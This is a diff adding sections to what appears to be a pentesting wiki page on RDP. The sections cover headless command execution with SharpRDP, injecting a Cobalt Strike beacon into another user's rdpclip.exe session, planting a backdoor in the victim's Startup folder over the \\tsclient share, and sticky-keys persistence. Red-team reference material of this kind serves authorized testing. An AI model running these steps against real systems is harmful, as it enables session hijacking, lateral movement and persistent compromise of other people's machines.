@@ -101,6 +101,19 @@ crackmapexec rdp <IP> -u <user> -p <password>
 {% endtab %}
 {% endtabs %}
 
+### Headless RDP
+
+{% tabs %}
+{% tab title="SharpRDP" %}
+Executing commands on a remote host is possible by using a headless (non-GUI) RDP lateral movement technique brought by a tool called [SharpRDP](https://github.com/0xthirteen/SharpRDP).
+
+```powershell
+#Execute commands on DC01 from a compromised system with offense\administrator 
+SharpRDP.exe computername=dc01 command=calc username=offense\administrator password=123456
+```
+{% endtab %}
+{% endtabs %}
+
 ### Vulnerabilities
 
 #### MS12-020  (CVE-2012-0152)
@@ -258,6 +271,90 @@ mstsc /v win10pro /admin /shadow:1 /control /noconsentprompt /prompt /f
 {% endtab %}
 {% endtabs %}
 
+### RDP Process Injection (rdpclip.exe)
+
+{% tabs %}
+{% tab title="RDP Process Injection" %}
+If someone from a different domain or with **better privileges login via RDP** to the PC where **you are an Admin**, you can **inject** your beacon in his **RDP session process** and act as him.
+
+```powershell
+# Supposing the group "External Users" has RDP access in the current domain
+## lets find where they could access
+## The easiest way would be with bloodhound, but you could also run:
+Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
+#or
+Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName
+
+# Then, compromise the listed machines, and wait til someone from the external domain logs in:
+net logons
+Logged on users at \\localhost:
+EXT\super.admin
+
+# With cobalt strike you could just inject a beacon inside of the RDP process
+beacon> ps
+ PID   PPID  Name                         Arch  Session     User
+ ---   ----  ----                         ----  -------     -----
+ ...
+ 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
+
+beacon> inject 4960 x64 tcp-local
+## From that beacon you can just run powerview modules interacting with the external domain as that user
+```
+{% endtab %}
+
+{% tab title="RDPInception" %}
+If a user access via **RDP into a machine** where an **attacker** is **waiting** for him with admin privileges, the attacker will be able to **inject a beacon in the RDP session of the user** and if the **victim mounted his drive** when accessing via RDP, the **attacker could access it**.
+
+In this case you could just **compromise** the **victims** **original computer** by writing a **backdoor** in the **statup folder**.
+
+```powershell
+# Wait til someone logs in:
+net logons
+Logged on users at \\localhost:
+EXT\super.admin
+
+# With cobalt strike you could just inject a beacon inside of the RDP process
+beacon> ps
+ PID   PPID  Name                         Arch  Session     User
+ ---   ----  ----                         ----  -------     -----
+ ...
+ 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
+
+beacon> inject 4960 x64 tcp-local
+
+# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
+## \\tsclient\c is the C: drive on the origin machine of the RDP session
+beacon> ls \\tsclient\c
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     02/10/2021 04:11:30   $Recycle.Bin
+          dir     02/10/2021 03:23:44   Boot
+          dir     02/20/2021 10:15:23   Config.Msi
+          dir     10/18/2016 01:59:39   Documents and Settings
+          [...]
+
+# Upload backdoor to startup folder
+beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+beacon> upload C:\Payloads\pivot.exe
+```
+{% endtab %}
+{% endtabs %}
+
+### Persistence - Sticky Keys & Utilmans <a href="#b6c3" id="b6c3"></a>
+
+Using **stickykeys** or **utilman** as a persistence vetcor, you will be able to access a administrative CMD and any RDP session anytime
+
+{% content-ref url="../../../windows/persistence/accessibility-features-backdoor.md" %}
+[accessibility-features-backdoor.md](../../../windows/persistence/accessibility-features-backdoor.md)
+{% endcontent-ref %}
+
 ## Resources
 
 {% embed url="https://net-security.fr/security/bluekeep-metasploit/" %}
+
+{% embed url="https://www.ired.team/offensive-security/lateral-movement/lateral-movement-over-headless-rdp-with-sharprdp" %}
+
+{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/rdp-sessions-abuse" %}
+
+{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp" %}
